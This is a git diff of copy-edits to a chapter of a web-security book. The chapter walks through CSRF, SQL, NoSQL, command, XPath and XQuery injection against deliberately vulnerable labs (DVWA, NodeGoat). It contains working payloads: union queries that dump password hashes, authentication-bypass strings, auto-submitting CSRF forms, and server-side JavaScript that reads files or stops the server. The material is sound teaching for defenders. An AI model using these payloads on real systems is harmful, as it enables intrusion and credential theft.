@@ -283,7 +283,7 @@ Below code can be found at [https://github.com/OWASP/NodeGoat/](https://github.c
        <button type="submit" class="btn btn-default" name="submit">Submit</button>
     </form>
 
-The below attack code can be found at the NodeGoat [tutorial for CSRF](https://nodegoat.herokuapp.com/tutorial/a8), along with the complete example that ckarande crafted, and an accompanying tutorial video of how the attack plays out:
+The attack code below can be found at the NodeGoat [tutorial for CSRF](https://nodegoat.herokuapp.com/tutorial/a8), along with the complete example that ckarande crafted, as well as an accompanying tutorial video of how the attack plays out:
 
 {title="Snippet from attackers website", linenos=off, lang=html, linenos=on}
     <html lang="en">
@@ -300,7 +300,7 @@ The below attack code can be found at the NodeGoat [tutorial for CSRF](https://n
        </body>
     </html>
 
-**For No. 2 above**, is similar to No. 1, but the target does not have to action anything once the fraudulent web page is loaded. The script block submits the form automatically, thus making the request to the website that the target is already authenticated with, the browser again playing its part in sending the session Id stored in the cookie:
+**For No. 2 above**, it is similar to No. 1, but the target does not have to take any action once the fraudulent web page is loaded. The script block submits the form automatically, thus making the request to the website that the target is already authenticated with. The browser again plays it's part in sending the Session Id stored in the cookie:
 
 {title="Snippet from attackers website", linenos=off, lang=html}
     <form id="theForm" action="http://TARGET_APP_URL_HERE/profile" method="post">
@@ -321,23 +321,23 @@ Some misnomers:
 ### Injection
 ![](images/ThreatTags/easy-common-average-severe.png)
 
-Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can cause the interpreter to execute commands that would otherwise not be, or accessing data without the correct authorization.
+Injection occurs when untrusted data is sent to an interpreter as part of a command or query. The attacker’s hostile data can cause the interpreter to execute commands that would not otherwise execute, or gain access to data without the correct authorization.
 
-In order for injection attacks to be successful, untrusted data must be unsuccessfully validated, filtered and sanitised before it reaches the interpreter.
+In order for injection attacks to be successful, untrusted data must be unsuccessfully validated, filtered, and sanitised before it reaches the interpreter. In worst case scenarios, due to horrible security practices, untrusted data isn't validated, filtered, or unsanitised at all.
 
-Injection defects are often easy to discover simply by examining the code that deals with untrusted data, including internal data. These same defects are often harder to discover when black-box testing, either manually or via fuzzers. Defects [can range](https://www.owasp.org/index.php/Injection_Flaws) from trivial to complete system compromise.
+Injection defects are often easy to discover simply by examining the code that handles untrusted data, including internal data. These same defects are often harder to discover when blackbox testing, either manually or via fuzzers. Defects [can range](https://www.owasp.org/index.php/Injection_Flaws) from trivial to complete system compromise.
 
-As part of the discovery stage, the attacker can test their queries to start building up what they think the underlying structure looks like. Then with any number of useful on-line query test tools, such as [freeformatter.com](http://www.freeformatter.com/), the attacker can make as little noise to signal ratio as possible.
+As part of the discovery stage, the attacker can test their queries to start enumerating what they think the underlying structure looks like. Then, with any number of useful on-line query test tools, such as [freeformatter.com](http://www.freeformatter.com/), the attacker can keep the signal to noise ratio as low as possible.
 
 #### SQLi {#web-applications-identify-risks-sqli}
 
 ![](images/HandsOnHack.png)
 
-One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it is still at the top of the hit lists. I am going to hammer this home some more. Also checkout the [podcast I hosted](http://www.se-radio.net/2017/09/se-radio-episode-302-haroon-meer-on-network-security/) with [Haroon Meer](https://twitter.com/haroonmeer) as guest on Network Security for Software Engineering Radio, where Haroon discussed using SQLi for data exfiltration.
+One of the simplest and quickest vulnerabilities to fix is SQL Injection, yet it remains at the top of vulnerability lists. I am going to hammer this home some more. Also checkout the [podcast I hosted](https://binarymist.io/publication/ser-podcast-network-security/) with [Haroon Meer](https://twitter.com/haroonmeer) as a guest on Network Security for Software Engineering Radio, where Haroon discussed using SQLi for data exfiltration.
 
 I> ## Synopsis
 I>
-I> I have used the Dam Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications [VM](http://sourceforge.net/projects/owaspbwa/files/) for this exercise. You can load this VM in a VMware product or add the virtual machine disk to a new VM in VirtualBox. It's an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it's sand-boxed from the rest of your network. You really don't want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.
+I> I have used the Damn Vulnerable Web Application (DVWA) from the OWASP Broken Web Applications [VM](http://sourceforge.net/projects/owaspbwa/files/) for this exercise. You can load this VM in a VMware product, or add the virtual machine disk to a new VM in VirtualBox. It's an Ubuntu 64 bit image. Once you have your VM ready to boot, use the Host-only Adapter so it's sandboxed from the rest of your network. You really don't want an attacker gaining access to this VM as it is purposely vulnerable and attacks could easily be launched from it.
 I>
 I> Start the machine.
 
@@ -345,37 +345,37 @@ I> Start the machine.
 G> ## The Play
 G>
 G> In your Kali Linux box, run owasp-zap.  
-G> If chromium is not already running, run it and setup foxyproxy for chrome using the burp proxy we set-up in the Tooling Setup chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Zap is now recording your browsing.
+G> If Chromium is not already running, run it and setup FoxyProxy for Chrome using the Burp Proxy we set-up in the Tooling Setup chapter of [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). Zap is now recording your browsing.
 G>
 G> Once you have started the VM and browsed to it, select the DVWA and log in as  
 G> user: "user", password "user". Make sure the Security Level is set to low.
 G>
 G> Navigate to the SQL Injecton page and enter `1` in the input box.
 G>
-G> In Zap: Right click on dvwa -> Attack -> Active Scan -> Start Scan
+G> In Zap: Right click on DVWA -> Attack -> Active Scan -> Start Scan
 G>
 G> When the scan has finished: go to the Alerts tab -> Select SQL Injection -> look at the request and response.  
-G> See Zap used a union query, but response said "The used SELECT statements have a different number of columns". Which means if we use the correct number of columns we will have success.  
+G> See where Zap used a union query, but the response said "The used SELECT statements have a different number of columns". This means that if we use the correct number of columns we will have success.  
 G>
-G> In Request tab, select input parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
+G> In Request tab, select Input Parameter -> right click and select Fuzz -> Payloads -> Add -> Select File Fuzzers from "Type" dropdown. Then select jbrofuzz->SQL Injection->SQL Injection -> Add -> OK -> Start Fuzzer
 G>
 G> Notice the `x' OR full_name LIKE '%bob%` in the Fuzzer tab?
 G>
-G> Then try the following in dvwa input:
+G> Then try the following in DVWA input:
 G>
 G> `x' OR full_name LIKE '%bob%`  
-G> Output: Tells us we are in a where clause and I had an unknown column name.  
-G> Thanks MySQL error reporting!
+G> Output: Tells us we are in a `WHERE` clause, and I had an unknown column name.  
+G> Thanks, MySQL error reporting!
 G>
 G> Try the following queries:  
 G> `x' OR first_name LIKE '%bob%`     # This works  
 G> `x' OR last_name LIKE '%smith%`    # This works  
 G> `x' OR first_name LIKE '%`         # And as expected, we get what we think are all users.
 G>
-G> Also the recon stage may tell us a lot about naming conventions and more. Once you know who the employees are:  
-G> Search stackoverflow, github, etc for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
+G> The recon stage may tell us a lot about naming conventions, and more. Once you know who the target organisation's employees are:  
+G> Search stackoverflow, github, etc. for tidbits. Also [gitrob](https://github.com/michenriksen/gitrob)  
 G> As we try different things, we learn more about naming conventions.  
-G> You may also be able to find out about the target organisations naming conventions by looking around the internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.
+G> You may also be able to find out about the target organisation's naming conventions by looking around the Internet. Github, Bitbucket, Stackoverflow and many other sites usually yield useful information.
 G>
 G> `x' OR user LIKE '%`               # This works  
 
@@ -385,15 +385,15 @@ G> `SELECT ID, first_name, last_name FROM users WHERE ID = ''`
 G>
 G> Time to work out what the table name is.
 G>
-G> Lets try users. I'm thinking that the full query will look like:  
+G> Let's try users. I'm thinking that the full query will look like:  
 G> `SELECT ID, first_name, last_name FROM users WHERE ID = '1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%'`  
 G> Inject query:  
 G> `1' UNION SELECT ID, first_name, last_name FROM users WHERE first_name LIKE '%`  
 G> Output: Unknown column 'ID'  
-G> Lets fix that:  
+G> Let's fix that:  
 G> `1' UNION SELECT user_id, first_name, last_name FROM users WHERE first_name LIKE '%`  
 G> Output: "The used SELECT statements have a different number of columns"  
-G> This told me that the query on the server was slightly different to what I thought. My revised guess of the full query:  
+G> This told me that the query on the server was slightly different than what I thought. My revised guess of the full query:  
 G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%'`  
 G> Inject query:  
 G> `1' UNION SELECT first_name, last_name FROM users WHERE first_name LIKE '%`
@@ -404,10 +404,10 @@ G> `SELECT first_name, last_name FROM users WHERE user_id = '1' UNION SELECT fir
 G> Inject query:  
 G> `1' UNION SELECT first_name, password FROM users WHERE first_name LIKE '%`
 G>
-G> Let's determine the hash type with hash-identifier. Just run it and throw the hash at it and it will tell you that it is most likely a simple MD5. which is a one-way hashing function with no Key derivation. It is so very quick to crack.
+G> Let's determine the hash type with hash-identifier. Just run the tool, and feed the hash to it. It will tell you that it is most likely a simple MD5, which is a one-way hashing function with no key derivation. It is so very easy to crack.
 G>
 G> Then take your pick of the following three commands:  
-G> Create `~/hashtocrack.txt` and put the hash(s) you want cracked in it. Now usually you would create a profiled wordlist taylored to your target like we did in the Password Profiling section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). For this exercise just add the following four words to `~/wordlist-to-throw-at-dvwa`:  
+G> Create `~/hashtocrack.txt` and put the hash(s) you want cracked in it. Usually you would create a profiled wordlist tailored to your target as we did in the Password Profiling section of the People chapter in [Fascicle 0](https://f0.holisticinfosecforwebdevelopers.com). For this exercise, just add the following four words to `~/wordlist-to-throw-at-dvwa`:  
 G> `dogs`, `cats`, `admins`, `admin`. Now you can compare the hashed words from the list with the hash in the `~/hashtocrack.txt`
 
 {icon=bomb}
@@ -432,28 +432,28 @@ G> Now we have our admin password and user.
 There are two main problems here.
 
 1. SQL Injection
-2. Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section and even more so the [Countermeasures](#web-applications-countermeasures-data-store-compromise) of. Do not follow this example of a lack of well salted and quality strong key derivation functions (KDFs) used on all of the sensitive data in your own projects.
+2. Poor decisions around sensitive data protection. We discuss this in depth further on in this chapter in the [Data-store Compromise](#web-applications-identify-risks-management-of-application-secrets-data-store-compromise) section, and even more so the [Countermeasures](#web-applications-countermeasures-data-store-compromise) section. Do not follow this example of bad practise. Use well salted and quality, strong key derivation functions (KDFs) on all of the sensitive data in your own projects.
 
 #### NoSQLi {#web-applications-identify-risks-nosqli}
 
-NoSQL Injection is semantically very similar to SQL Injection and Command Injection with JavaScript running on the server. The main differences are in the syntax of the attack.
+NoSQL Injection is semantically very similar to SQL Injection and Command Injection with JavaScript on vulnerable servers. The main differences are in the syntax of the attack.
 
-NoSQL data stores often provide greater performance and scaling benefits, but in terms of security, they are disadvantaged due to far fewer relational and consistency checks.
+NoSQL data stores often provide greater performance and scaling benefits, but in terms of security, they are at a disadvantage due to far fewer relational and consistency checks.
 
-There are currently [over 225 types of NoSQL](http://nosql-database.org/) data stores, and each one does things differently. This of course means that if all we considered was the number of systems compared to SQL, then the likelihood of confusion around what a safe query looks like in any given NoSQL engine has increased dramatically. There is also more room for an attacker to move within NoSQL queries than with SQL due to being heavily dependent on JavaScript which is a dynamic loosely typed general purpose language rather than the far more tightly constrained declarative SQL.
+There are currently [over 225 types of NoSQL](http://nosql-database.org/) data stores, and each one does things differently. This means that if we only considered the number of NoSQL systems as compared to SQL, then the likelihood of confusion specific to safe queries for any given NoSQL engine has increased dramatically. There is also more room for an attacker to move within NoSQL queries than with SQL due to being heavily dependent on JavaScript, which is a dynamic, loosely typed general purpose language rather than the far more tightly constrained declarative SQL.
 
-Because there are so many types of NoSQL data store, crafting the attacks is often implementation specific, and because of that, the countermeasures are also implementation specific, making it even more work to provide a somewhat secure environment for your untrusted data to pass through. It often feels like there is no safe passage.
+Because there are so many types of NoSQL data stores, crafting the attacks is often implementation specific, and due to that, the countermeasures are also implementation specific, making it even more work to provide a somewhat secure environment for your untrusted data to pass through. It often feels as if there is no safe passage.
 
-The data store queries are usually written in the programming language of the application, or buried within an API of the same language. Often the ubiquitous JavaScript is used, which can be executed in the Web UI, the server side code if it is JavaScirpt, and then the particular type of NoSQL data store. Therefore, there are many more execution contexts that can be attacked.
+NoSQL data store queries are usually written in the programming language of the application, or buried within an API of the same language. Often, the ubiquitous JavaScript is used, which can be executed in the Web UI, the server-side code if it is JavaScript, and then the particular type of NoSQL data store. Therefore, there are many more execution contexts that can be attacked.
 
-I can not possibly cover all of the types of NoSQL data store, so the below is an example of some mongodb. 
+I can not possibly cover all of the types of NoSQL data stores, below is an example specific to mongodb. 
 
 A typical SQL query used to select a user based on their username and password might look like the following:
 
 {linenos=off, lang="SQL"}
     SELECT * FROM accounts WHERE username = '$username' AND password = '$password'
 
-If the `$username` and `$password` fields were not properly validated, filtered and sanitised, an attacker could supply  
+If the `$username` and `$password` fields were not properly validated, filtered, and sanitised, an attacker could supply  
 `admin' --`  
 as the username and the resulting query would look like:
 
@@ -467,7 +467,7 @@ The equivalent of a MongoDB query could be:
 {linenos=off}
     db.accounts.find({username: username, password: password});
 
-One way an attacker could attempt to bypass the password if the untrusted data was not being validated would be to supply a username of:  
+One way an attacker could attempt to bypass the password, if the untrusted data was not being validated, would be to supply a username of:  
 `admin`  
 and a password of:  
 `{$gt: ""}`  
@@ -481,17 +481,17 @@ The MongoDB [`$gt` comparison operator](https://docs.mongodb.com/manual/referenc
 
 #### Command Injection {#web-applications-identify-risks-command-injection}
 
-The following examples target JavaScript running on the server. If your application on the server is written in some other language, then the attacker just needs to supply code of that language for it to be executed.
+The following examples target JavaScript running on the server. If your application on the server is written in some other language, then the attacker just needs to supply code in that language for it to be executed.
 
 The following functions are easily exploited by an attacker by simply supplying the code they want to execute as a string of text input:
 
-The JavaScript [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function executes the string of code it is passed with the privileges of the caller.
+The JavaScript [`eval`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval) function executes the string of code passed to it with the privileges of the caller.
 
 The JavaScript [`setTimeout`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setTimeout) and [`setInterval`](https://developer.mozilla.org/en-US/docs/Web/API/WindowOrWorkerGlobalScope/setInterval) functions allow you to pass a string of code as the first argument, which is compiled and executed on timer expiration (with `setTimeout`), and at intervals (with `setInterval`).
 
 The JavaScript [`Function`](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function) constructor takes an arbitrary number of string arguments which are used as the formal parameter names within the function body that the constructor creates. The last argument passed to the `Function` constructor is also a string, but it contains the statements that are to be executed as the `Function` object that is returned.
 
-The purposely vulnerable Node Web Application NodeGoat, provides some simple examples in the form of executable [code](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L24-L26) including some absolute bare minimum countermeasures, a [tutorial](https://nodegoat.herokuapp.com/tutorial/a1) with videos of exploiting Command Injection in the form of a Denial of Service (DoS), by passing  
+The purposely vulnerable Node Web Application NodeGoat provides some simple examples in the form of executable [code](https://github.com/OWASP/NodeGoat/blob/b475010f2de3d601eda3ad2498d9e6c729204a09/app/routes/contributions.js#L24-L26) including some absolute bare minimum countermeasures. There's also a [tutorial](https://nodegoat.herokuapp.com/tutorial/a1) with videos of Command Injection in the form of a Denial of Service (DoS), by passing  
 `while(1)`  
 or  
 `process.exit()`  
@@ -508,15 +508,15 @@ through some input fields of the Web UI. It also covers discovery of the names o
 {title="Reveal file contents", linenos=off, lang=JavaScript}
     res.end(require('fs').readFileSync(filename));
 
-The attacker can take this further by writing new files and executing files on the server.
+The attacker can further this attack by writing new files and executing files on the server.
 
-Many web applications take untrusted data, often from HTTP requests and pass this data directly to the Operating System, its programs, or even other systems, often by APIs, which is now addressed by the OWASP Top 10 [A10 Under protected APIs](https://www.owasp.org/index.php/Top_10_2017-A10-Underprotected_APIs)
+Many web applications take untrusted data, often from HTTP requests, and pass this data directly to the operating system, its programs, or even other systems, often by APIs. This is now addressed by the OWASP Top 10 [A10 Under protected APIs](https://www.owasp.org/index.php/Top_10_2017-A10-Underprotected_APIs)
 
-Also check out the Additional Resources chapter for [command injection](#additional-resources-web-applications-risks-injection-command-injection) attack techniques.
+Also, check out the Additional Resources chapter for [command injection](#additional-resources-web-applications-risks-injection-command-injection) attack techniques.
 
 #### XML Injection {#web-applications-identify-risks-xml-injection}
 
-XML injection techniques usually consist of a discovery stage followed by full exploitation if successful:
+XML injection techniques usually consist of a discovery stage, followed by full exploitation, if successful:
 
 1. Attempting to create invalid XML document by injecting various [XML metacharacters](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Discovery) (metacharacter injection):
   * Single quotes: `'`
@@ -525,14 +525,12 @@ XML injection techniques usually consist of a discovery stage followed by full e
   * Comment tags: `<!--` and `-->`
   * Ampersand: `&`
   * CDATA section delimiters: `<![CDATA[` and `]]>` allowing an attacker to form executable code
-2. Injecting an untrusted XML document which is accepted and not contextually validated, filtered or sanitised by the parser. That is if XML documents are accepted. Exploiting the XML parser that is configured to resolve, validate and process external entities in the form of Document Type Definitions (DTDs) and XML Schema Definitions (XSDs). This is known as [XML External Entity](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) (XXE) exploitation
-3. Attempting to modify the XML structure by injecting various XML data and Tags ([tag injections](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Tag_Injection))
-
-and witnessing how the parser deals with the data.
+2. Injecting an untrusted XML document which is accepted and not contextually validated, filtered or sanitised by the parser, assuming XML documents are accepted. One can also exploit the XML parser that is configured to resolve, validate and process external entities in the form of Document Type Definitions (DTDs) and XML Schema Definitions (XSDs). This is known as [XML External Entity](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) (XXE) exploitation
+3. Attempting to modify the XML structure by injecting various XML data and Tags ([tag injections](https://www.owasp.org/index.php/Testing_for_XML_Injection_(OTG-INPVAL-008)#Tag_Injection)) and witnessing how the parser deals with the data
 
 There are a number of XML attack categories exploitable via injection that target weaknesses.
 
-At the 2017 [OWASP New Zealand Day](https://www.owasp.org/index.php/OWASP_New_Zealand_Day_2017#tab=Presentation_Schedule) conference, Adam Bell did a presentation called "XML Still Considered Dangerous" covering the following:
+At the 2017 [OWASP New Zealand Day](https://www.owasp.org/index.php/OWASP_New_Zealand_Day_2017#tab=Presentation_Schedule) conference, Adam Bell presented "XML Still Considered Dangerous" covering the following:
 
 * Parameter expansion
 * XML External Entities (XXE)
@@ -542,7 +540,7 @@ Check out Adam's [slide-deck](https://www.owasp.org/images/4/48/2017-04-20-OWASP
 
 #### [XSLT Injection](https://www.owasp.org/images/a/ae/OWASP_Switzerland_Meeting_2015-06-17_XSLT_SSRF_ENG.pdf) {#web-applications-identify-risks-xslt-injection}
 
-There is a lot that can go wrong in XSLT, the following is a collection of some of the vulnerabilities to be aware of:
+A lot can go wrong with Extensible Stylesheet Language Transformations (XSLT); following is a collection of some of the vulnerabilities to be aware of:
 
 * Leveraging XPath to refer to parts of XML documents
 * Susceptible to XXE of local and remote files, as well as include additional arbitrary XSL files
@@ -554,7 +552,7 @@ There is a lot that can go wrong in XSLT, the following is a collection of some 
 
 #### XPath Injection {#web-applications-identify-risks-xpath-injection}
 
-Similarly to generic injection when XPath incorporates untrusted data that has not been validated, filtered and sanitised based on the execution context in question. This is discussed in the "[What is Sanitisation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation)" section of the Lack of Input Validation, Filtering and Sanitisation section of Identify Risks. The intended logic of the query can be modified which allows an attacker to inject purposely malformed data into a website. This allows them to make educated guesses based on what is returned, the data and any error messages, then the attacker can build a picture of how the XML structure looks. Similar to XML Injection, the attacker will usually carry out this discovery stage followed by full exploitation if successful.
+XPath injection is similar to generic injection when XPath incorporates untrusted data that has not been validated, filtered, and sanitised based on the execution context in question. This is discussed in the "[What is Sanitisation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-sanitisation)" section of the Lack of Input Validation, Filtering and Sanitisation section of Identify Risks. The intended logic of the query can be modified, which allows an attacker to inject purposely malformed data into a website. This allows the attacker to make educated guesses based on what is returned, the data, and any error messages. The attacker can then build a picture of what the XML structure looks like. Similar to XML Injection, the attacker will usually carry out this discovery stage, followed by full exploitation if successful.
 
 Although this attack technique is similar to SQLi, XPath has no provision for [commenting](https://www.owasp.org/index.php/Comment_Injection_Attack#Examples) out tails of expressions:
 
@@ -562,9 +560,9 @@ Although this attack technique is similar to SQLi, XPath has no provision for [c
 * MySQL: `#`
 * MS Access: `%00`
 
-XPath is a standards based language, unlike SQL, its syntax is implementation independent, this allows attacks to be automated across many targets that use user input to query XML documents.
+XPath is a standards-based language. Unlike SQL, its syntax is implementation independent, this allows attacks to be automated across many targets that accept user input to query XML documents.
 
-Unlike SQL where certain commands and queries are run as specific users, allowing the principle of least privilege to be applied to any given command or query based on the user running it. With XPath, there is no notion of Access Control Lists (ACLs), this means that a query can [access every part](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)#Summary) of the XML document. For example, if user credentials are being stored in an XML document, they can be retrieved and allow the attacker to elevate their privileges to those of other users, perhaps even to an administrator if the administrators credentials are stored in the XML document.
+Typically in SQL, certain commands and queries are run as specific users, utilising the principle of least privilege to be applied to any given command or query based on the user running it. In XPath, there is no notion of Access Control Lists (ACLs). This means that a query can [access every part](https://www.owasp.org/index.php/Testing_for_XPath_Injection_(OTG-INPVAL-010)#Summary) of the XML document. For example, if user credentials are being stored in an XML document, they can be retrieved and allow the attacker to elevate their privileges to those of other users, perhaps even to an administrator if the administrators credentials are stored in the XML document.
 
 Use the following XML document for examples:
 
@@ -587,16 +585,16 @@ Use the following XML document for examples:
        </User>
     </Users>
 
-[Blind injection](https://www.owasp.org/index.php/Blind_XPath_Injection) is a technique that is used in many types of injection. A blind injection attack is used where the attacker does not know what the underlying query is, or in the case of XPath, XML document looks like, and/or when the feedback from the application reveals little detail in terms of data or error messages. Often booleanised queries and/or XML Crawling are used to facilitate the blind injection attacks.
+[Blind injection](https://www.owasp.org/index.php/Blind_XPath_Injection) is a technique that is used in many types of injection. A blind injection attack is used where the attacker does not know what the underlying query is. In the case of XPath, the attacker doesn't know what the XML document looks like, and/or the feedback from the application reveals little detail in terms of data or error messages. Often booleanised queries and/or XML Crawling are used to facilitate the blind injection attacks.
 
 **Booleanised Queries** are those that return very granular true/false information based on very small amounts of data supplied by the attacker.
 
-The following XPath query returns the first character of the first child node (no mater what it is called) of the first User:
+The following XPath query returns the first character of the first child node (no matter what it is called) of the first User:
 
 {linenos=off, lang="XQuery"}
     substring((//User[1]/*[1]),1,1)
 
-The following XPath query returns the length of the forth element (no mater what it is called) of the first User:
+The following XPath query returns the length of the fourth element (no matter what it is called) of the first User:
 
 {linenos=off, lang="XQuery"}
     string-length(//User[1]/*[4])
@@ -608,21 +606,21 @@ For example, the following reveals that the number of `Users` is 2:
 {linenos=off, lang="XQuery"}
     count(//Users/*)
 
-The following reveals that the length of the value at the fourth position of the child node (no mater what it is called) of the first `User` is in fact 9 characters long. Is the `Password` nine characters long? True.
+The following reveals that the length of the value at the fourth position of the child node (no matter what it is called) of the first `User` is in fact 9 characters long. Is the `Password` nine characters long? True.
 
 {linenos=off, lang="XQuery"}
     string-length(//User[position()=1]/*[position()=4])=9
 
-The following query can be used to confirm that the first character of the fourth child node (no mater what it is called) of the first `User` is in fact `3`:
+The following query confirms that the first character of the fourth child node (no matter what it is called) of the first `User` is, in fact, `3`:
 
 {linenos=off, lang="XQuery"}
     substring((//User[1]/*[4]),1,1)="3"
 
-Checkout the OWASP [XML Crawling](https://www.owasp.org/index.php/Blind_XPath_Injection#XML_Crawling) documentation for further details. The queries at the OWASP documentation did not work for me, hence why I have supplied ones that do.
+Checkout the OWASP [XML Crawling](https://www.owasp.org/index.php/Blind_XPath_Injection#XML_Crawling) documentation for further details. The queries provided in OWASP documentation did not work for me, hence, why I have supplied ones that do.
 
 Using booleanised queries can be very good for automated attacks, usually because many of these granular tests need to be performed. Because they are so small, an attacker can aggregate them, making them very versatile.
 
-Continuing on: If our target application contains logic to retrieve the account type, once the user provides their username and password and the legitimate administrator has entered their credentials, that logic may look similar to the following:
+Continuing on, if our target application contains logic to retrieve the account type, once the user provides their username and password, and the legitimate administrator has entered their credentials, that logic may look similar to the following:
 
 {linenos=off, lang="XQuery"}
     string(//User[UserName/text()='jdeer' and Password/text()='3xp10it3d']/Type/text())
@@ -634,20 +632,20 @@ Username:
 Password:  
 `' or '1'='1`
 
-Then the above query will look more like the following:
+then the above query will look more like the following:
 
 {linenos=off, lang="XQuery"}
     string(//User[UserName/text()='' or '1'='1' and Password/text()='' or '1'='1']/Type/text())
 
-Which although the attacker has not supplied a valid `UserName` or `Password`, according to the XPath query, they are still authenticated, because the query will always evaluate to true. This is called an authentication bypass for obvious reasons. You may notice that this attack looks very similar to many other SQLi attacks.
+Although the attacker has not supplied a valid `UserName` or `Password`, according to the XPath query, they are still authenticated, because the query will always evaluate to true. This is called an authentication bypass for obvious reasons. You may notice that this attack looks very similar to many other SQLi attacks.
 
-The available XPath functions and XSLT specific additions to XPath are [documented](https://developer.mozilla.org/en-US/docs/Web/XPath/Functions) at Mozilla Developer Network (MDN)
+The available XPath functions and XSLT-specific additions to XPath are [documented](https://developer.mozilla.org/en-US/docs/Web/XPath/Functions) at Mozilla Developer Network (MDN)
 
-Technically, XPath is used to select parts of an XML document, it has no provision for updating. In saying that the command injection can be used to modify data that XPath returns. Standard language libraries usually provide functionality for modifying XML documents, along with the XML Data Modification Language ([DML](https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml)) that we will discuss soon in the next section.
+Technically, XPath is used to select parts of an XML document, it has no provision for updating. In saying that, command injection can be used to modify data that XPath returns. Standard language libraries usually provide functionality for modifying XML documents, along with the XML Data Modification Language ([DML](https://docs.microsoft.com/en-us/sql/t-sql/xml/xml-data-modification-language-xml-dml)), which we'll discuss in the next section.
 
 #### XQuery Injection {#web-applications-identify-risks-xquery-injection}
 
-XQuery being a superset of XPath, suffers from the same vulnerabilities as XPath, plus the SQL-like `FOR`, `LET`, `WHERE`, `ORDER BY`, `RETURN` (FLWOR) expression abilities. Hopefully coming as no surprise, the attack vectors are a combination of those discussed in [XPath Injection](#web-applications-identify-risks-xpath-injection) and [SQLi](#web-applications-identify-risks-sqli). The canonical example is provided below thanks to [projects.webappsec.org](http://projects.webappsec.org/w/page/13247006/XQuery%20Injection%7C):
+XQuery, being a superset of XPath, suffers from the same vulnerabilities as XPath, plus the SQL-like `FOR`, `LET`, `WHERE`, `ORDER BY`, `RETURN` (FLWOR) expression abilities. As a result, the attack vectors are a combination of those discussed in [XPath Injection](#web-applications-identify-risks-xpath-injection) and [SQLi](#web-applications-identify-risks-sqli). The canonical example is provided below thanks to [projects.webappsec.org](http://projects.webappsec.org/w/page/13247006/XQuery%20Injection%7C):
 
 {title="users.xml", linenos=off, lang="XML"}
     <?xml version="1.0" encoding="UTF-8"?>
@@ -747,14 +745,14 @@ Also consider reviewing the [Storage of Secrets](#cloud-identify-risks-storage-o
 * Passwords and other secrets for things like data-stores, syslog servers, monitoring services, email accounts and so on can be useful to an attacker to compromise data-stores, obtain further secrets from email accounts, file servers, system logs, services being monitored, etc, and may even provide credentials to continue moving through the network compromising other machines.
 * Passwords and/or their hashes travelling over the network.
 
-#### Data-store Compromise {#web-applications-identify-risks-management-of-application-secrets-data-store-compromise}
+#### Datastore Compromise {#web-applications-identify-risks-management-of-application-secrets-data-store-compromise}
 ![](images/ThreatTags/difficult-widespread-average-moderate.png)
 
 The reason I have tagged this as moderate is because if you take the countermeasures, it doesn't have to be a disaster.
 
 The New Zealand Intelligence Service [told](http://www.stuff.co.nz/national/politics/73704551/homegrown-threats-more-serious-says-spy-boss-rebecca-kitteridge) New Zealand's previous Prime Minister John Key, that one of the 6 top threats facing New Zealand is a "_Cyber attack or loss of information and data, which poses financial and reputational risks._"
 
-There are numerous examples of data-store compromise that happen on a daily basis. If only organisations put in place what I outlined in the countermeasures section, then millions of users would not have their identifies stolen. Sadly the advice security expets suggest is rarely followed. What happened in the Ashley Madison debacle is a very good example, as Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, and provide their clients discretion and anonymity. 
+There are numerous examples of datastore compromise that happen on a daily basis. If only organisations put in place what I outlined in the countermeasures section, then millions of users would not have their identifies stolen. Sadly the advice security expets suggest is rarely followed. What happened in the Ashley Madison debacle is a very good example, as Ashley Madison's entire business relied on its commitment to keep its clients (37 million of them) data secret, and provide their clients discretion and anonymity. 
 
 "_Before the breach, the company boasted about airtight data security but ironically, still proudly displays a graphic with the phrase “trusted security award” on its homepage_"
 
@@ -764,7 +762,7 @@ There are numerous examples of data-store compromise that happen on a daily basi
 
 > Dark Reading
 
-Another notable data-store compromise is [LinkedIn](https://en.wikipedia.org/wiki/2012_LinkedIn_hack) where 6.5 million user accounts where compromised and 95% of the users passwords cracked within days. Why so fast? Because they used simple hashing, specifically SHA-1. Also when [EBay](http://www.darkreading.com/attacks-breaches/ebay-database-hacked-with-stolen-employee-credentials-/d/d-id/1269093) got hacked affecting their 145 million active buyers. Many others coming to light regularly.
